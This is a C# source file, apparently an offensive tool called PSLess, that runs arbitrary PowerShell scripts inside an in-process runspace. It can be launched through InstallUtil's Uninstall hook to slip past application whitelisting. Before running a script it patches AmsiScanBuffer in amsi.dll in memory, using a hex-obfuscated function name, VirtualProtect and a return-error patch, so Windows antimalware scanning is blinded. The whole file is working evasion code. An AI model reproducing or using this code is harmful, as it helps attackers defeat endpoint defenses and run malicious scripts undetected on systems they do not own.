using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Runtime.InteropServices;
using System.IO;
using System;
using System.Text;
using System.Configuration.Install;
namespace PSLess
{
 [System.ComponentModel.RunInstaller(true)]
 public class InstallUtil : System.Configuration.Install.Installer
 {
   public override void Uninstall(System.Collections.IDictionary savedState)
   {
       string[] args= {this.Context.Parameters["ScriptName"]};
       PSLess.Main(args);
    }
  }
 
class PSLess
 {
   [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
	public static void Main(string[] args)
   {
     if (args.Length == 0)
       Environment.Exit(1);
     string script = LoadScript(args[0]);
     string s = RunScript(script);
     Console.WriteLine(s);
   }
  private static string LoadScript(string filename)
  {
    string buffer = "";
    try
    {
     buffer = File.ReadAllText(filename);
    }
    catch (Exception e)
    {
      Console.WriteLine(e.Message);
      Environment.Exit(2);
    }
    return buffer;
  }
    public static int Disable()
          {
            string hexbuffer = "41 6d 73 69 53 63 61 6e 42 75 66 66 65 72";
	    string buffer="";
	    string[] hexbuffersplit = hexbuffer.Split(' ');
	    foreach (String hex in hexbuffersplit)
            {
               
                int value = Convert.ToInt32(hex, 16);
               
                buffer+= Char.ConvertFromUtf32(value);
                
            }
            IntPtr Address = GetProcAddress(LoadLibrary("amsi.dll"), buffer);

            UIntPtr size = (UIntPtr)5;
            uint p = 0;

            VirtualProtect(Address, size, 0x40, out p);

            Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);
            Marshal.Copy(Patch, 0, unmanagedPointer, 6);
            MoveMemory(Address, unmanagedPointer, 6);

            return 0;
          } 
  private static string RunScript(string script)
  {
    Runspace MyRunspace = RunspaceFactory.CreateRunspace();
    MyRunspace.Open();
	  Disable();
    Pipeline MyPipeline = MyRunspace.CreatePipeline();
    MyPipeline.Commands.AddScript(script);
    MyPipeline.Commands.Add("Out-String");
    Collection<PSObject> outputs = MyPipeline.Invoke();
    MyRunspace.Close();
    StringBuilder sb = new StringBuilder();
    foreach (PSObject pobject in outputs)
    {
     sb.AppendLine(pobject.ToString());
    }
    return sb.ToString();
  }
 }
}
